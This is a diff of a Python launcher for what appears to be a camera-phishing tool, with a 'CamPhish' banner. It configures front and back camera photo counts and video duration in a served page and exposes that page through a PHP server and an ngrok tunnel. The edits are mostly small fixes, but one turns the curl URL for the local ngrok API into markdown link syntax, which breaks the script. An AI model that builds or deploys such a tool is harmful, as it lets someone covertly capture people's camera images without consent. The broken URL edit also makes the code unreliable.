@@ -1,14 +1,20 @@
 import subprocess,time,re,shutil,sys,os,random
 from datetime import datetime
+
+# Fixing Import Logic: Install AND Import if missing
 try:
     from watchdog.observers import Observer
     from watchdog.events import FileSystemEventHandler
-except:
+except ImportError:
     os.system('pip install watchdog')
+    from watchdog.observers import Observer
+    from watchdog.events import FileSystemEventHandler
+
 try:
     from colorama import init,Fore
-except:
+except ImportError:
     os.system('pip install colorama')
+    from colorama import init,Fore
 
 init()  
 
@@ -66,9 +72,10 @@ def tokenngrok():
 user = os.popen("whoami").read().strip()
 os.environ["USER"] = user
 
+# Fixed SyntaxWarning by using rf""" (raw f-string)
 if OS():
     os.environ["HOME"] = os.environ.get("HOME") 
-    b = f"""{colors['cyan']}                                                                                           
+    b = rf"""{colors['cyan']}                                                                                           
 ▄█████  ▄▄▄  ▄▄   ▄▄ █████▄ ▄▄ ▄▄ ▄▄  ▄▄▄▄ ▄▄ ▄▄ 
 ██     ██▀██ ██▀▄▀██ ██▄▄█▀ ██▄██ ██ ███▄▄ ██▄██ 
 ▀█████ ██▀██ ██   ██ ██     ██ ██ ██ ▄▄██▀ ██ ██ 
@@ -78,7 +85,7 @@ if OS():
 else:
     if 'Linux' in __import__("platform").system():
         os.environ["HOME"] = f"/home/{user}"
-    b = f"""{colors['cyan']}
+    b = rf"""{colors['cyan']}
        _..._                                                                                          
     .-'_..._''.                                                                                       
   .' .'      '.\          __  __   ___  _________   _...._        .        .--.           .           
@@ -122,17 +129,21 @@ if forindex == "Y":
         'backVideoSeconds': r'let backVideoSeconds = \d+;'
     }
 
-    with open(INDEX, 'r', encoding='utf-8') as file:
-        content = file.read()
+    try:
+        with open(INDEX, 'r', encoding='utf-8') as file:
+            content = file.read()
 
-    content = re.sub(patterns['frontPhotoCount'], f'let frontPhotoCount = {front_photo_count};', content)
-    content = re.sub(patterns['backPhotoCount'], f'let backPhotoCount = {back_photo_count};', content)
-    content = re.sub(patterns['frontVideoSeconds'], f'let frontVideoSeconds = {front_video_seconds};', content)
-    content = re.sub(patterns['backVideoSeconds'], f'let backVideoSeconds = {back_video_seconds};', content)
+        content = re.sub(patterns['frontPhotoCount'], f'let frontPhotoCount = {front_photo_count};', content)
+        content = re.sub(patterns['backPhotoCount'], f'let backPhotoCount = {back_photo_count};', content)
+        content = re.sub(patterns['frontVideoSeconds'], f'let frontVideoSeconds = {front_video_seconds};', content)
+        content = re.sub(patterns['backVideoSeconds'], f'let backVideoSeconds = {back_video_seconds};', content)
 
-    with open(INDEX, 'w', encoding='utf-8') as file:
-        file.write(content)
-    clear
+        with open(INDEX, 'w', encoding='utf-8') as file:
+            file.write(content)
+    except FileNotFoundError:
+        print(f"{messages['error']}Could not find {INDEX} to update settings.")
+    
+    clear() # Fixed typo: changed 'clear' to 'clear()'
     print(b)
 
 def php_server():
@@ -160,7 +171,7 @@ def ngrok(port):
 def ngrok_url():
     try:
         result = subprocess.run(
-            ['curl', '-s', '-N', 'http://127.0.0.1:4040/api/tunnels'],
+            ['curl', '-s', '-N', '[http://127.0.0.1:4040/api/tunnels](http://127.0.0.1:4040/api/tunnels)'],
             capture_output=True,
             text=True
         )
@@ -204,5 +215,5 @@ if __name__ == "__main__":
         php_proc.terminate()
         ngrok_proc.terminate()
         observer.stop()
-
         observer.join()
+    
